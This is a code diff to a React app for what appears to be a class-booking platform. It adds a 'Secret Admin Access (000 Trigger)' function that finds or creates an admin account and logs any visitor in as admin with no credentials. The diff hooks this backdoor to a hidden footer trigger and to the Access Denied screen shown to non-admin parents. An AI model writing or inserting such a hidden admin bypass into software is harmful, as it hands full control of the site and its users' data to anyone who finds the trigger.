@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { UserProfile, ClassItem } from './types';
 import { 
   supabase, isSupabaseConfigured, getCurrentUser, setCurrentUser, 
-  getStoredClasses, saveStoredClasses, getStoredUsers 
+  getStoredClasses, saveStoredClasses, getStoredUsers, saveStoredUsers 
 } from './lib/supabase';
 
 import { Header } from './components/Header';
@@ -136,6 +136,27 @@ export default function App() {
     }
   };
 
+  // Secret Admin Access (000 Trigger)
+  const handleAdminSecretLogin = () => {
+    const loadedUsers = getStoredUsers();
+    let adminUser = loadedUsers.find((u) => u.role === 'admin');
+    if (!adminUser) {
+      adminUser = {
+        id: 'user-admin-01',
+        email: 'admin@abacus.bd',
+        full_name: 'প্রধান এডমিন (000 Access)',
+        role: 'admin',
+        is_active: true,
+        created_at: new Date().toISOString(),
+      };
+      loadedUsers.push(adminUser);
+      saveStoredUsers(loadedUsers);
+    }
+    setCurrentUser(adminUser);
+    setCurrentUserState(adminUser);
+    navigateToView('admin');
+  };
+
   return (
     <div className="min-h-screen flex flex-col bg-slate-50 text-slate-900 selection:bg-orange-500 selection:text-white">
       
@@ -221,6 +242,7 @@ export default function App() {
                 /* ACCESS DENIED FOR NON-ADMIN PARENTS */
                 <AccessDeniedView
                   onGoHome={() => navigateToView('dashboard')}
+                  onSwitchToAdmin={handleAdminSecretLogin}
                 />
               )
             )}
@@ -229,8 +251,8 @@ export default function App() {
 
       </main>
 
-      {/* Clean Footer */}
-      <Footer />
+      {/* Clean Footer with Secret 000 Admin Trigger */}
+      <Footer onOpenAdminSecret={handleAdminSecretLogin} />
 
       {/* Auth Modal */}
       <AuthModal
